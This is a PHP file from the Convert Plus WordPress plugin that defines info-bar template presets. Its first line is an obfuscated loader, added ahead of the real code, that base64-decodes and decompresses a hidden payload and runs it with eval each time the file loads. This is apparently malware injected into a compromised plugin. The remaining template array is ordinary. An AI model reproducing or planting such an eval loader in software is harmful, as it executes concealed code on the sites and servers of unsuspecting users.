<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

/**
 * Function Name: cp_add_info_bar_template action to add templates.
 *
 * @param  array  $args   settings array.
 * @param  string $preset string parameters.
 * @param  string $module string parameters.
 * @return array         array of settings.
 */
function cp_add_info_bar_template( $args, $preset, $module ) {
	/**
 * Array Format
 * array(
	'locked_content', // theme slug for template
	'International Conference', // template name
	CP_PLUGIN_URL . 'modules/modal/assets/demos/locked_content/locked_content.html', // HTML file for template
	'http://downloads.brainstormforce.com/convertplug/presets/screenshot_international_conf.png', // screen shot url for template
	CP_PLUGIN_URL . 'modules/modal/assets/demos/locked_content/customizer.js', // customizer js for template
	'All,Offers', // categories
	'Shortcode,Canvas,HTML,Custom', // tags
	'international_conference', // template unique slug
	)
 */
	if ( 'info_bar' === $module ) {

		$modal_temp_array = array(

			'vector'                =>
			array(
				'image_preview',
				'Free Images',
				CP_PLUGIN_URL . 'modules/info_bar/assets/demos/image_preview/image_preview.html',
				'http://downloads.brainstormforce.com/convertplug/presets/screenshot_vector.png',
				CP_PLUGIN_URL . 'modules/info_bar/assets/demos/image_preview/customizer.js',
				'All,Offers',
				'Shortcode,Canvas,HTML,Custom',
				'vector',
			),
			'simple_text_notice'    =>
			array(
				'blank',
				'Text Notice',
				CP_PLUGIN_URL . 'modules/info_bar/assets/demos/blank/blank.html',
				'http://downloads.brainstormforce.com/convertplug/presets/info-screenshot.png',
				CP_PLUGIN_URL . 'modules/info_bar/assets/demos/blank/customizer.js',
				'All,info bar',
				'Shortcode,Canvas,HTML,Custom,Notice',
				'simple_text_notice',
			),
			'stickybar_newsletter'  =>
			array(
				'newsletter',
				'Sticky Newsletter',
				CP_PLUGIN_URL . 'modules/info_bar/assets/demos/newsletter/newsletter.html',
				'http://downloads.brainstormforce.com/convertplug/presets/cp_id_d66dc.png',
				CP_PLUGIN_URL . 'modules/info_bar/assets/demos/newsletter/customizer.js',
				'All,Optins,info bar',
				'Shortcode,Canvas,HTML,Custom,Notice',
				'stickybar_newsletter',
			),
			'social_infobar_circle' =>
			array(
				'social_info_bar',
				'Social Info Bar Circle',
				CP_PLUGIN_URL . 'modules/info_bar/assets/demos/social_info_bar/social_info_bar.html',
				'http://downloads.brainstormforce.com/convertplug/presets/social_site.png',
				CP_PLUGIN_URL . 'modules/info_bar/assets/demos/social_info_bar/customizer.js',
				'All,Optins,info bar',
				'Shortcode,Canvas,HTML,Custom,Notice',
				'social_infobar_circle',
			),
		);

		if ( '' !== $preset ) {
			$temp_arr                    = $modal_temp_array[ $preset ];
			$modal_temp_array            = array();
			$modal_temp_array[ $preset ] = $temp_arr;
			$args                        = array_merge( $args, $modal_temp_array );
		} else {
			$args = array_merge( $args, $modal_temp_array );
		}
	}

	return $args;
}
